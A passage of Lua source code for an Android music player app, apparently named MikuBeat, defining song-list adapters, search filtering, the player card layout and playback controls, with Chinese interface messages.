  getItemCount = function()
    return #localMusicCacheList
  end,

  onCreateViewHolder = function()
    local view = {}
    local holder = LuaCustRecyclerHolder(loadlayout("layout.musicCard", view))
    holder.view.setTag(view)

    view.cardLoveImg.onClick = function()
      local info = localMusicCacheList[holder.getAdapterPosition()+1]["info"]
      local from = localMusicCacheList[holder.getAdapterPosition()+1]["from"]
      loveManager.loveClick(info, from, view.cardLoveImg)
      adapterManager.refreshAdapter(true, false, false, true, false, false, true)
    end

    view.cardToChooseMusic.onClick = function()
      if canClick
        local index = holder.getAdapterPosition()+1
        setPlayTable(localMusicCacheList)
        playerManager.playMusic(index)
       else
        myToast.toast("别催别催，在学了（｀へ´）")
      end
    end

    view.cardPopMenu.onClick = function()
      local info = localMusicCacheList[holder.getAdapterPosition()+1]["info"]
      local from = localMusicCacheList[holder.getAdapterPosition()+1]["from"]

      local pop = PopupMenu(activity, view.cardPopMenu)

      pop.menu.add("歌曲信息").onMenuItemClick = function()
        localMusicManager.musicInfoDialog(info)
      end
      pop.menu.add("分享歌曲").onMenuItemClick = function()
        if File(info).isFile()
          activity.shareFile(info)
         else
          myToast.toast("文件不存在")
        end
      end
      pop.show()
    end

    return holder
  end,
  onBindViewHolder = function(holder, position)
    local view = holder.view.getTag()
    local index = position + 1

    if moreAnimation
      animationMod.onClickBounce(view.cardToChooseMusic, 0.98, 200)
      animationMod.onClickBounce(view.cardPopMenu, 0.9, 200)
    end

    if loveManager.isLoved(localMusicCacheList[index]["info"])
      applyGlide("/res/imgs/loved.png", view.cardLoveImg)
     else
      applyGlide("/res/imgs/love.png", view.cardLoveImg)
    end

    view.cardMusicArtist.text = localMusicCacheList[index]["title"]
    view.cardMusicName.text = string.match(localMusicCacheList[index]["info"], "[^/]+$") or ""

    if localMusicCacheList[index].cover
      pcall(function()
        Glide.with(activity).load(localMusicCacheList[index].cover).into(view.cardMusicPicture)
      end)
      view.cardMusicPicture.colorFilter=0x00000000
      --view.cardMusicPicture.setImageBitmap(cover)
     else
      applyGlide("/res/imgs/miku1.png", view.cardMusicPicture)
      view.cardMusicPicture.colorFilter=Colors.colorOnSurface
    end
  end,
}
localMusicAdapter = LuaCustRecyclerAdapter(AdapterCreator(localListAdpTable))
musicLocalList
.setAdapter(localMusicAdapter)
.setLayoutManager(LinearLayoutManager(activity))


local function refreshLocalMusic()
  add.clickable=false
  local loading = require "loading"
  loading.show("(ÒωÓ๑ゝ∠)\n玩命加载中...可能需要较长时间")
  task(function(m)
    local a = m:new()
    a:getAllAudio()
    return a
    end,localMusicManager, function(localMusicList)
    localMusicCacheList = localMusicList.musics
    localMusicAdapter.notifyDataSetChanged()
    add.clickable=true
    loading.dismiss()
    myToast.toast("刷新好了๑乛◡乛๑")
  end)
end


-----------全部歌曲-------------


task(function(func)
  func()
  end, function()
  totalMusics = table.clone(musicList)
  for i = 1, #userAdds
    table.insert(totalMusics, userAdds[i])
  end
  for i = 1, #localMusicCacheList
    table.insert(totalMusics, localMusicCacheList[i])
  end
  end, function()
  searchMusics = totalMusics
  local totalAdpTab = {
    getItemCount = function()
      return #searchMusics
    end,
    onCreateViewHolder = function()
      local view = {}
      local holder = LuaCustRecyclerHolder(loadlayout("layout.musicCard3", view))
      holder.view.setTag(view)


      view.cardLoveImg.onClick = function()
        local index = holder.getAdapterPosition() + 1
        local from = searchMusics[index]["from"]
        local info = searchMusics[index]["info"]
        loveManager.loveClick(info, from, view.cardLoveImg, true)
        adapterManager.refreshAdapter(true, true, true, true, false, false, true)
        if from == "local"
          localMusicAdapter.notifyDataSetChanged()
        end
      end

      view.cardToChooseMusic.onClick = function()
        if canClick
          setPlayTable(searchMusics)
          playerManager.playMusic(holder.getAdapterPosition()+1)
         else
          myToast.toast("别催别催，在学了（｀へ´）")
        end
      end

      view.cardPopMenu.onClick = function()
        local info = searchMusics[holder.getAdapterPosition()+1]["info"]
        local from = searchMusics[holder.getAdapterPosition()+1]["from"]

        local pop = PopupMenu(activity, view.cardPopMenu)

        if from ~= "local"
          pop.menu.add("跳转MV").onMenuItemClick = function()
            if canClick
              if from == "wyy"
                music163.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
               elseif from == "bili"
                biliManager.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
              end
             else
              myToast.toast("别催别催，在学了（｀へ´）")
            end
          end
        end
        pop.menu.add("歌曲信息").onMenuItemClick = function()
          if from == "wyy"
            music163.musicInfoDialog(info)
           elseif from == "bili"
            biliManager.musicInfoDialog(info)
           elseif from == "local"
            localMusicManager.musicInfoDialog(info)
           else
            --baka
          end
        end
        if from ~= "local"
          pop.menu.add("导出歌曲").onMenuItemClick = function()
            if canClick
              if from == "wyy"
                music163.saveToSD(info)
               elseif from == "bili"
                biliManager.saveToSD(info)
               else
                --baka
              end
             else
              myToast.toast("别催别催，在学了（｀へ´）")
            end
          end
        end
        pop.menu.add("分享歌曲").onMenuItemClick = function()
          local sl
          if from == "wyy"
            sl = music163.idtosl(info)
           elseif from == "bili"
            sl = "https://m.bilibili.com/video/"..info
           elseif from == "local"
            if File(info).isFile()
              activity.shareFile(info)
             else
              myToast.toast("文件不存在")
            end
           else
            --baka
          end
          if sl
            local text = "分享歌曲:\n"..view.cardMusicName.text.."--"..view.cardMusicArtist.text.."\n"..sl.." (来自@MikuBeat)"
            copyText(text)
            myToast.toast("已经将链接放在剪切板里了(◔◡◔)")
          end
        end
        if from ~= "local"
          pop.menu.add("删除缓存").onMenuItemClick = function()
            if from == "wyy"
              music163.subMusicById(info)
             elseif from == "bili"
              biliManager.subMusicByBv(info)
             else
              --baka
            end
          end
        end
        pop.show()
      end

      return holder
    end,
    onBindViewHolder = function(holder, position)
      local view = holder.view.getTag()
      local index = position + 1

      if moreAnimation
        animationMod.onClickBounce(view.cardToChooseMusic, 0.98, 200)
        animationMod.onClickBounce(view.cardLoveImg, 0.9, 200)
        animationMod.onClickBounce(view.cardPopMenu, 0.9, 200)
      end

      if loveManager.isLoved(searchMusics[index]["info"])
        applyGlide("/res/imgs/loved.png", view.cardLoveImg)
       else
        applyGlide("/res/imgs/love.png", view.cardLoveImg)
      end

      local from = searchMusics[index]["from"]
      local info = searchMusics[index]["info"]

      if from == "wyy"
        music163.idGetMsg(info,function(msgs)
          if msgs["code"] == 200
            pcall(function()
              Glide.with(activity).load(msgs["pic"]).into(view.cardMusicPicture)
              view.cardMusicPicture.colorFilter=0x00000000
            end)
            if msgs["name"] view.cardMusicName.text = msgs["name"] end
            if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
          end
        end)

       elseif from == "bili"
        biliManager.bvGetMsg(info, function(msgs)
          if msgs["code"] == 200
            pcall(function()
              Glide.with(activity).load(msgs["cover"]).into(view.cardMusicPicture)
              view.cardMusicPicture.colorFilter=0x00000000
            end)
            if msgs["name"] view.cardMusicName.text = msgs["name"] end
            if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
          end
        end)

       elseif from == "local"
        local msgs = localMusicManager.getCacheMsgByPath(info)
        view.cardMusicArtist.text = (msgs and msgs["title"]) or "E: no Title"
        view.cardMusicName.text = string.match(info, "[^/]+$") or "E: no Path"

        if (msgs or {}).cover
          pcall(function()
            Glide.with(activity).load(msgs.cover).into(view.cardMusicPicture)
          end)
          view.cardMusicPicture.colorFilter=0x00000000
          --view.cardMusicPicture.setImageBitmap(cover)
         else
          applyGlide("/res/imgs/miku1.png", view.cardMusicPicture)
          view.cardMusicPicture.colorFilter=Colors.colorOnSurface
        end
       else
      end

    end,
  }

  totalMusicAdapter = LuaCustRecyclerAdapter(AdapterCreator(totalAdpTab))
  totalMusicList
  .setAdapter(totalMusicAdapter)
  .setLayoutManager(LinearLayoutManager(activity))
  totalProgress.visibility=8
end)


local function searchMusicFunc(callback)
  callback = callback or function() end
  local searchMusics = {}
  local cache = {}
  local wyyChip = wyyChip.isChecked()
  local biliChip = biliChip.isChecked()
  local localChip = localChip.isChecked()
  local loveChip = loveChip.isChecked()
  if wyyChip == biliChip
    && biliChip == localChip
    && localChip == loveChip
    cache = table.clone(totalMusics)
   else
    for i=1, #totalMusics
      local from = totalMusics[i]["from"]
      if wyyChip and from == "wyy"
        || biliChip and from == "bili"
        || localChip and from == "local"
        || loveChip and loveManager.isLoved(totalMusics[i]["info"])
        table.insert(cache, totalMusics[i])
      end
    end
  end

  local search = search.text or "" --搜索内容
  search = string.lower(search)
  local songNameChip = songNameChip.isChecked()
  local singerNameChip = singerNameChip.isChecked()
  if search == "" --为空则返回全部，不再搜索
   else --不为空，搜索
    if songNameChip == singerNameChip and songNameChip == false --令全不选等价全选
      songNameChip = true
      singerNameChip = true
    end

    local cacheFunc = function() end
    if songNameChip == singerNameChip
      cacheFunc = function(a, b)
        return a and b
      end
     else
      cacheFunc = function(a, b)
        return a or b
      end
    end
    --print(dump(searchMusics))

    for i = 1, #cache --迭代搜索

      local from = cache[i]["from"]
      local info = cache[i]["info"]

      if from == "wyy"
        music163.idGetMsg(info,function(msgs)
          if msgs["code"] == 200
            if cacheFunc(songNameChip and not string.find(string.lower(msgs["name"]), search, 1, true), --选中项对应的信息里找不到搜索内容就移除
              singerNameChip and not string.find(string.lower(msgs["artist"]), search, 1, true))
              cache[i]=nil
            end
          end
        end)
       elseif from == "bili"
        biliManager.bvGetMsg(info, function(msgs)
          if msgs["code"] == 200
            if cacheFunc(songNameChip and not string.find(string.lower(msgs["name"]), search, 1, true),
              singerNameChip and not string.find(string.lower(msgs["artist"]), search, 1, true))
              cache[i]=nil
            end
          end
        end)
       elseif from == "local"
        local msgs = localMusicManager.getCacheMsgByPath(info)
        if cacheFunc(songNameChip and not string.find(string.lower(string.match(info, "[^/]+$") or "E: no Path"), search, 1, true),
          singerNameChip and not string.find(string.lower((msgs or {})["title"] or "E: no Title"), search, 1, true))
          cache[i]=nil
        end
       else
        --？？
      end

    end

  end
  task(1000, function()
    for i, v in pairs(cache)
      table.insert(searchMusics, v)
    end
    callback(searchMusics)
  end)
end



-----------以下为当前播放列表-----------


local nowPlayAdpTab = {
  getItemCount = function()
    return #nowPlayMusics
  end,
  onCreateViewHolder = function()
    local view = {}
    local holder = LuaCustRecyclerHolder(loadlayout("layout.musicCard", view))
    holder.view.setTag(view)


    view.cardLoveImg.onClick = function()
      local index = holder.getAdapterPosition() + 1
      local from = nowPlayMusics[index]["from"]
      local info = nowPlayMusics[index]["info"]
      loveManager.loveClick(info, from, view.cardLoveImg, true)
      adapterManager.refreshAdapter(true, true, true, true, false, false, true)
      if from == "local"
        localMusicAdapter.notifyDataSetChanged()
      end
    end

    view.cardToChooseMusic.onClick = function()
      if canClick
        playerManager.playMusic(holder.getAdapterPosition()+1)
       else
        myToast.toast("别催别催，在学了（｀へ´）")
      end
    end

    view.cardPopMenu.onClick = function()
      local info = nowPlayMusics[holder.getAdapterPosition()+1]["info"]
      local from = nowPlayMusics[holder.getAdapterPosition()+1]["from"]

      local pop = PopupMenu(activity, view.cardPopMenu)

      if from ~= "local"
        pop.menu.add("跳转MV").onMenuItemClick = function()
          if canClick
            if from == "wyy"
              music163.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
             elseif from == "bili"
              biliManager.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
            end
           else
            myToast.toast("别催别催，在学了（｀へ´）")
          end
        end
      end
      pop.menu.add("歌曲信息").onMenuItemClick = function()
        if from == "wyy"
          music163.musicInfoDialog(info)
         elseif from == "bili"
          biliManager.musicInfoDialog(info)
         elseif from == "local"
          localMusicManager.musicInfoDialog(info)
         else
          --baka
        end
      end
      if from ~= "local"
        pop.menu.add("导出歌曲").onMenuItemClick = function()
          if canClick
            if from == "wyy"
              music163.saveToSD(info)
             elseif from == "bili"
              biliManager.saveToSD(info)
             else
              --baka
            end
           else
            myToast.toast("别催别催，在学了（｀へ´）")
          end
        end
      end
      pop.menu.add("分享歌曲").onMenuItemClick = function()
        local sl
        if from == "wyy"
          sl = music163.idtosl(info)
         elseif from == "bili"
          sl = "https://m.bilibili.com/video/"..info
         elseif from == "local"
          if File(info).isFile()
            activity.shareFile(info)
           else
            myToast.toast("文件不存在")
          end
         else
          --baka
        end
        if sl
          local text = "分享歌曲:\n"..view.cardMusicName.text.."--"..view.cardMusicArtist.text.."\n"..sl.." (来自@MikuBeat)"
          copyText(text)
          myToast.toast("已经将链接放在剪切板里了(◔◡◔)")
        end
      end
      if from ~= "local"
        pop.menu.add("删除缓存").onMenuItemClick = function()
          if from == "wyy"
            music163.subMusicById(info)
           elseif from == "bili"
            biliManager.subMusicByBv(info)
           else
            --baka
          end
        end
      end
      pop.show()
    end

    return holder
  end,
  onBindViewHolder = function(holder, position)
    local view = holder.view.getTag()
    local index = position + 1

    if moreAnimation
      animationMod.onClickBounce(view.cardToChooseMusic, 0.98, 200)
      animationMod.onClickBounce(view.cardLoveImg, 0.9, 200)
      animationMod.onClickBounce(view.cardPopMenu, 0.9, 200)
    end

    if loveManager.isLoved(nowPlayMusics[index]["info"])
      applyGlide("/res/imgs/loved.png", view.cardLoveImg)
     else
      applyGlide("/res/imgs/love.png", view.cardLoveImg)
    end

    local from = nowPlayMusics[index]["from"]
    local info = nowPlayMusics[index]["info"]

    if from == "wyy"
      music163.idGetMsg(info,function(msgs)
        if msgs["code"] == 200
          pcall(function()
            Glide.with(activity).load(msgs["pic"]).into(view.cardMusicPicture)
            view.cardMusicPicture.colorFilter=0x00000000
          end)
          if msgs["name"] view.cardMusicName.text = msgs["name"] end
          if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
        end
      end)

     elseif from == "bili"
      biliManager.bvGetMsg(info, function(msgs)
        if msgs["code"] == 200
          pcall(function()
            Glide.with(activity).load(msgs["cover"]).into(view.cardMusicPicture)
            view.cardMusicPicture.colorFilter=0x00000000
          end)
          if msgs["name"] view.cardMusicName.text = msgs["name"] end
          if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
        end
      end)

     elseif from == "local"
      local msgs = localMusicManager.getCacheMsgByPath(info)
      view.cardMusicArtist.text = (msgs and msgs["title"]) or "E: no Title"
      view.cardMusicName.text = string.match(info, "[^/]+$") or "E: no Path"

      if (msgs or {}).cover
        pcall(function()
          Glide.with(activity).load(msgs.cover).into(view.cardMusicPicture)
        end)
        view.cardMusicPicture.colorFilter=0x00000000
        --view.cardMusicPicture.setImageBitmap(cover)
       else
        applyGlide("/res/imgs/miku1.png", view.cardMusicPicture)
        view.cardMusicPicture.colorFilter=Colors.colorOnSurface
      end
     else
    end

  end,
}

nowPlayListAdapter = LuaCustRecyclerAdapter(AdapterCreator(nowPlayAdpTab))
nowPlayListRecycler
.setAdapter(nowPlayListAdapter)
.setLayoutManager(LinearLayoutManager(activity))




playlistHome.onClick = function()
  nowPlayMusics = getPlayTable()
  if type(nowPlayMusics) == "table" and #nowPlayMusics ~= 0
    nowPlayListAdapter.notifyDataSetChanged()
    nowPlayListRecycler.scrollToPosition((getPlayIndex() or 1)-1)
    replace(7, true)
    return1Flag = 7
   else
    myToast.toast("当前没有播放列表哦，快去听歌吧")
  end
end



------以下为轮播图-----

local function dp2px(dpValue)
  local scale = activity.getResources().getDisplayMetrics().density;
  return dpValue * scale + 0.5
end

local carouselImgList = require "res.carouselImgList"

carouselImgList(function(carouselImgList)
  local carouselAdpTab = {
    getItemCount = function()
      return #carouselImgList
    end,
    onCreateViewHolder = function()
      local view = {}
      local holder = LuaCustRecyclerHolder(loadlayout("layout.carouselLay", view))
      holder.view.setTag(view)

      view.carouselImg.onClick = function()
        print(holder.getAdapterPosition())
      end

      return holder
    end,
    onBindViewHolder = function(holder, position)
      local view = holder.view.getTag()
      Glide.with(activity).load(carouselImgList[holder.getAdapterPosition() % #carouselImgList + 1]).into(view.carouselImg)
    end,
  }

  local indicator = IndicatorView(this)
  .setIndicatorSelectedRadius(3.7) --设置选中的圆角，默认和indicatorRadius值一致，可单独设置选中的点大小
  .setIndicatorSelectedRatio(1.7) --设置选中圆比例，拉伸圆为矩形，控制该比例，默认比例和indicatorRatio一致，默认值1.0

  carousel
  .setIndicator(indicator)
  .setAdapter(LuaCustRecyclerAdapter(AdapterCreator(carouselAdpTab)), 1)
  .setPageMargin(dp2px(20), dp2px(10))
  .addPageTransformer(ScaleInTransformer())
end)

---------------以下为playerCard展开收起动态布局---------------


local playerCardOpenFlag = false --展开标识_是否展开
local paramsBegin = {} --原params备份_便于复原直接使用

--LayoutParams复制 by xiayu
--@ param LayoutParams params 要复制的LayoutParams
--@ return LayoutParams 复制出的新LayoutParams
local function cloneLayoutParams(params)
  local paramsClass = params.getClass()
  local newParams = paramsClass(-2, -2)
  local fields = paramsClass.getFields()
  local fieldNames = {}

  for i, field in jpairs(fields) do
    if Modifier.isStatic(field.getModifiers()) then
      continue
    end
    local name = field.getName()
    newParams[name] = params[name]
  end

  return newParams
end

local function setParams(view, table)
  local params = view.getLayoutParams()
  local newParams = cloneLayoutParams(params)
  paramsBegin[view.getId()] = newParams

  for k, v in pairs(table)
    params[k] = v
  end

  view.setLayoutParams(params)
end

local function recoverParams(viewTable)
  for _, view in pairs(viewTable) do
    view.setLayoutParams(paramsBegin[view.getId()])
  end
end

---[[
local function playerCardOpen()
  playerCardOpenFlag = true
  setParams(playerCardMusicImg, {
    ["height"] = dp2px(260),
    ["width"] = dp2px(260),
  })
  setParams(fiilInScreen, {
    ["height"] = activity.getHeight(),
    ["bottomMargin"] = 0,
  })
  setParams(fiilInScreenCard, {
    ["height"] = activity.getHeight(),
    ["leftMargin"] = 0,
    ["rightMargin"] = 0,
    ["gravity"] = 17,
  })
  setParams(fillInCardLinear, {
    ["height"] = activity.getHeight(),
  })
  setParams(playerCardMsgs, {
    ["height"] = activity.getHeight() / 10,
    ["width"] = activity.getWidth() / 1.2,
    ["leftMargin"] = dp2px(16),
    ["rightMargin"] = dp2px(16),
    ["weight"] = 0,
    ["bottomMargin"] = dp2px(25),
    ["topMargin"] = dp2px(25),
  })
  setParams(playerCardName, {
    ["gravity"] = 17, --center
  })
  setParams(playerCardArtist, {
    ["gravity"] = 17,
  })
  setParams(playerCardPrevious, {
    ["height"] = dp2px(35),
    ["width"] = dp2px(35),
    ["rightMargin"] = dp2px(16),
    ["leftMargin"] = dp2px(16),
  })
  setParams(playerCardPlay, {
    ["height"] = dp2px(40),
    ["width"] = dp2px(40),
    ["rightMargin"] = dp2px(16),
    ["leftMargin"] = dp2px(16),
  })
  setParams(playerCardNext, {
    ["height"] = dp2px(35),
    ["width"] = dp2px(35),
    ["rightMargin"] = dp2px(16),
    ["leftMargin"] = dp2px(16),
  })
  playerCardArtist.textSize = 20
  playerCardName.textSize = 30
  fillInCardLinear.orientation = 1
  fiilInScreenCard.clickable = false
  fillInCardLinear.clickable = true
  animationMod.TPAnim(playerCardDragBarLine, 400, 0, 1)
  animationMod.TPAnim(playerCardLove, 400, 0, 1)
  animationMod.TPAnim(playerCardOrder, 400, 0, 1)
end
--]]

local function playerCardClose()
  playerCardOpenFlag = false
  recoverParams({
    fiilInScreen,
    fiilInScreenCard,
    fillInCardLinear,
    playerCardMusicImg,
    playerCardName,
    playerCardArtist,
    playerCardPrevious,
    playerCardNext,
    playerCardPlay,
  })
  setParams(playerCardMsgs, {
    ["height"] = -2,
    ["width"] = -2,
    ["leftMargin"] = dp2px(16),
    ["rightMargin"] = dp2px(16),
    ["weight"] = 1,
    ["bottomMargin"] = 0,
    ["topMargin"] = 0,
  })
  playerCardName.textSize = 16
  playerCardArtist.textSize = 12
  fillInCardLinear.orientation = 0
  fiilInScreenCard.clickable = true
  fillInCardLinear.clickable = false
  animationMod.TPAnim(playerCardDragBarLine, 200, 1, 0)
  animationMod.TPAnim(playerCardLove, 200, 1, 0)
  animationMod.TPAnim(playerCardOrder, 200, 1, 0)
end

fiilInScreenCard.onClick = playerCardOpen

if moreAnimation
  animationMod.addFunc(add)
  animationMod.onClickBounce(openHistoryOfHome, 0.98, 200)
  animationMod.onClickBounce(fillInCardLinear, 0.998, 200)
  animationMod.onClickBounce(usedNow, 0.96, 200)
  animationMod.onClickBounce(playerCardMusicImgCard, 0.98, 200)
  animationMod.onClickBounce(playerCardLove, 0.93, 200)
  animationMod.onClickBounce(playerCardPrevious, 0.93, 200)
  animationMod.onClickBounce(playerCardPlay, 0.93, 200)
  animationMod.onClickBounce(playerCardNext, 0.93, 200)
  animationMod.onClickBounce(playerCardOrder, 0.93, 200)
  animationMod.onClickBounce(addDeveloper, 0.98, 200)
  animationMod.onClickBounce(thankDeveloper, 0.98, 200)
  animationMod.onClickBounce(annouHome, 0.98, 200)
  animationMod.onClickBounce(setting, 0.98, 200)
  animationMod.onClickBounce(about, 0.98, 200)
  animationMod.onClickBounce(updateLogAbout, 0.98, 200)
  animationMod.onClickBounce(permissionAndInformationAbout, 0.98, 200)
  animationMod.onClickBounce(joinUs, 0.98, 200)
  animationMod.onClickBounce(joinUsMore, 0.98, 200)
  animationMod.onClickBounce(checkUpdateMore, 0.98, 200)
  animationMod.onClickBounce(infoCardMore, 0.98, 200)
  animationMod.onClickBounce(iconMore, 0.98, 200)
  animationMod.onClickBounce(versionNameMore, 0.95, 200)
 else
  ---------add fab的显示与隐藏，含music页面recycler滑动监听----------
  local function setupWithFab(recycler)
    recycler.addOnScrollListener(RecyclerView.OnScrollListener{
      onScrolled=function(v,s,j)
        if j>0
          add.hide()
        end
        if j<0
          add.show()
        end
      end
    })
  end
  setupWithFab(musicMusicList)
  setupWithFab(musicUserAddList)
  setupWithFab(musicLoveList)
  setupWithFab(musicLocalList)
end

applyGlideUncompressed("/res/imgs/"..(loveManager.isLoved(activity.getSharedData("nowPlayId")) and "loved" or "love")..".png", playerCardLove)
applyGlideUncompressed("/res/imgs/previous.png", playerCardPrevious)
applyGlideUncompressed("/res/imgs/play.png", playerCardPlay)
applyGlideUncompressed("/res/imgs/next.png", playerCardNext)
applyGlideUncompressed("/res/imgs/"..(activity.getSharedData("loopOneOrder") and "loopOne" or "loopAll")..".png", playerCardOrder)


--------------播放器相关---------------


local loadin

pcall(function()
  local index = getPlayIndex()
  local isRecreat = activity.getSharedData("isRecreat")
  local list = getPlayTable()
  if playLastPlay and index or isRecreat then
    if isRecreat
      activity.setSharedData("isRecreat", false)
    end
    loadin = true
    local from = list[index]["from"]
    local info = list[index]["info"]

    if from == "wyy"
      music163.idGetMusic(info, function(sp)
        player.setDataSource(sp)
        .prepareAsync()
      end)
     elseif from == "bili"
      biliManager.bvGetMusic(info, function(sp)
        player.reset()
        .setDataSource(sp)
        .prepareAsync()
      end)
     elseif from == "local"
      if File(info).isFile()
        pcall(function() --防止意外文件
          player.reset()
          .setDataSource(info)
          .prepareAsync()
        end)
      end
     else
    end
  end
end)


player.setOnPreparedListener(MediaPlayer.OnPreparedListener{
  onPrepared=function(mediaPlayer)
    canClick = true
    if loadin
      loadin = false
      pcall(function()
        local time = activity.getSharedData("lastPlayTime")
        mediaPlayer.seekTo(time)
      end)
    end
    setPlayIndex(cachePlayIndex)
    local index = cachePlayIndex
    local list = getPlayTable()
    local from = list[index]["from"]
    local info = list[index]["info"]
    if loveManager.isLoved(info)
      applyGlideUncompressed("/res/imgs/loved.png", playerCardLove)
     else
      applyGlideUncompressed("/res/imgs/love.png", playerCardLove)
    end
    applyGlideUncompressed("/res/imgs/pause.png", playerCardPlay)
    mediaPlayer.start()
    playerCardMusicEndTime.setText(ms2minsec(mediaPlayer.getDuration()))
    historyManager.addHistory(info, from)
    historys = historyManager.getHistory()
    historyAdapter.notifyDataSetChanged() --那么播放时就不应刷新history
    if from == "local" --本地
      --这里需要完善
      local msgs = localMusicManager.getCacheMsgByPath(info)
      playerCardArtist.text = tostring(msgs and msgs["title"])
      playerCardName.text = string.match(info, "[^/]+$") or ""
      local cover = msgs and msgs["cover"]
      if cover
        applyGlideUncompressed(cover, playerCardMusicImg, true)
        playerCardMusicImg.colorFilter=0x00000000
        --view.cardMusicPicture.setImageBitmap(cover)
       else
        applyGlideUncompressed("/res/imgs/miku3.png", playerCardMusicImg)
        playerCardMusicImg.colorFilter=Colors.colorOnSurface
      end
     elseif from == "wyy" --网易云
      music163.idGetMsg(info, function(msg)
        applyGlideUncompressed(msg["pic"], playerCardMusicImg, true)
        playerCardName.text = msg["name"]
        playerCardArtist.text = msg["artist"]
        playerCardMusicImg.colorFilter=0x00000000
      end)
     elseif from == "bili" --哔站
      biliManager.bvGetMsg(info, function(msgs)
        applyGlideUncompressed(msgs["cover"], playerCardMusicImg, true)
        playerCardName.text = msgs["name"]
        playerCardArtist.text = msgs["artist"]
        playerCardMusicImg.colorFilter=0x00000000
      end)
     else
    end
  end
})

player.setOnCompletionListener(MediaPlayer.OnCompletionListener{
  onCompletion=function(player)
    playerManager.nextPlayAuto()
  end
})

function loveManager.loveClick(info, from, view, dontRefresh)
  local list = getPlayTable()
  local index = getPlayIndex()
  local flag
  if list and index
    flag = info == list[index]["info"]
   else
    flag = false
  end
  if loveManager.isLoved(info)
    loveManager.subLoveMusic2(info)
    applyGlide("/res/imgs/love.png", view)
    if flag
      applyGlideUncompressed("/res/imgs/love.png", playerCardLove)
    end
   else
    loveManager.addLoveMusic(info, from)
    applyGlide("/res/imgs/loved.png", view)
    if flag
      applyGlideUncompressed("/res/imgs/loved.png", playerCardLove)
    end
  end
  if not dontRefresh totalMusicAdapter.notifyDataSetChanged() end
end

-----------播放卡片------------

local gradientPlayCard = activity.getSharedData("gradientPlayCard")
if gradientPlayCard == nil or gradientPlayCard
  local GradientDrawable = bindClass "android.graphics.drawable.GradientDrawable"
  fillInCardLinear.setBackgroundDrawable(GradientDrawable(GradientDrawable.Orientation.TL_BR, {
    Colors.colorPrimary-0xD8000000,
    --0,
    0x2739C5BB,
  }))
end

playerCardDragBar.setLabelFormatter(function(v)
  return ms2minsec(v*player.getDuration())
end)

playerCardDragBar.addOnSliderTouchListener({
  onStartTrackingTouch = function(slider)
  end,
  onStopTrackingTouch = function(slider)
    if player.isPlaying()
      player.seekTo(slider.getValue()*player.getDuration())
     else
      player.start()
      player.seekTo(slider.getValue()*player.getDuration())
      player.pause()
    end
  end,
})


appVolume.addOnSliderTouchListener({
  onStartTrackingTouch = function(slider)
  end,
  onStopTrackingTouch = function(slider)
    local volume = tointeger(slider.getValue())/100
    activity.setSharedData("volume", tostring(volume))
    player.setVolume(volume, volume)
  end,
})


--更新进度条和当前播放时间
local Ticker = bindClass "com.androlua.Ticker"
local tk = Ticker()
tk.Period = activity.getSharedData("sliderUpdateTime")
tk.onTick = function()
  pcall(function()
    local v = player.getCurrentPosition()/player.getDuration()
    if v < 0 or v > 1 return end
    playerCardDragBar.setValue(v)
    playerCardMusicCurrentTime.setText(ms2minsec(player.getCurrentPosition()))
  end)
end
tk.start()

playerCardLove.onClick = function()
  local list = getPlayTable()
  local index = getPlayIndex()
  if list and index
    loveManager.loveClick(list[index]["info"], list[index]["from"], playerCardLove)
    adapterManager.refreshAdapter(true, true, true, true, false, false, true)
    if list[index]["from"] == "local"
      localMusicAdapter.notifyDataSetChanged()
    end
  end
end

playerCardPrevious.onClick = function()
  if canClick
    playerManager.previous()
   else
    myToast.toast("别催别催，在学了（｀へ´）")
  end
end

playerCardPlay.onClick = function()
  if player.isPlaying() then
    applyGlideUncompressed("/res/imgs/play.png", playerCardPlay)
    player.pause()
   else
    applyGlideUncompressed("/res/imgs/pause.png", playerCardPlay)
    player.start()
  end
end

playerCardNext.onClick = function()
  if canClick
    playerManager.nextPlay()
   else
    myToast.toast("别催别催，在学了（｀へ´）")
  end
end

playerCardOrder.onClick = function()
  if activity.getSharedData("loopOneOrder")
    activity.setSharedData("loopOneOrder", false)
    applyGlideUncompressed("/res/imgs/loopAll.png", playerCardOrder)
   else
    activity.setSharedData("loopOneOrder", true)
    applyGlideUncompressed("/res/imgs/loopOne.png", playerCardOrder)
  end
end

-----------

playerCardMusicImgCard.onLongClick = function()
  local list = getPlayTable()
  local index = getPlayIndex()
  local from = list[index]["from"]
  local info = list[index]["info"]
  if from == "wyy"
    music163.idGetMsg(info,function(msg)
      Http.download(msg.pic, "/sdcard/Pictures/"..tostring(info)..".jpg",function(code)
        if code == 200 then
          local MediaScannerConnection = bindClass "android.media.MediaScannerConnection"
          MediaScannerConnection.scanFile(activity, {File("/sdcard/Pictures/"..tostring(info)..".jpg").getAbsolutePath()}, {"image/png"}, nil)
          myToast.toast("封面已经下载好了꒰ *•ɷ•* ꒱\n[File:/sdcard/Pictures/"..tostring(info)..".jpg]")
         else
          myToast.toast("布豪，下载失败惹 o(╥﹏╥)o ")
        end
      end)
    end)
   elseif from == "bili"
    biliManager.bvGetMsg(info, function(msg)
      Http.download(msg.cover, "/sdcard/Pictures/"..info..".png",function(code)
        if code == 200 then
          local MediaScannerConnection = bindClass "android.media.MediaScannerConnection"
          MediaScannerConnection.scanFile(activity, {File("/sdcard/Pictures/"..info..".png").getAbsolutePath()}, {"image/png"}, nil)
          myToast.toast("封面已经下载好了꒰ *•ɷ•* ꒱\n[File:/sdcard/Pictures/"..info..".png]")
         else
          myToast.toast("布豪，下载失败惹 o(╥﹏╥)o ")
        end
      end)
    end)
   elseif from == "local"
    info = localMusicManager.getCacheMsgByPath(info)
    if info and info["cover"]
      local path = "/sdcard/Pictures/"..tostring(info["id"])..".png"
      local LuaUtil = bindClass "com.androlua.LuaUtil"
      LuaUtil.copyDir(info["cover"], path)
      local MediaScannerConnection = bindClass "android.media.MediaScannerConnection"
      MediaScannerConnection.scanFile(activity, {File(path).getAbsolutePath()}, {"image/png"}, nil)
      myToast.toast("封面已经保存好了꒰ *•ɷ•* ꒱\n[File:"..path.."]")
     else
      myToast.toast("貌似没有封面哦")
    end
   else
  end
end

add.onClick = function()
  local vpIndex = cvpg.getCurrentItem()
  if vpIndex == 0 or vpIndex == 3
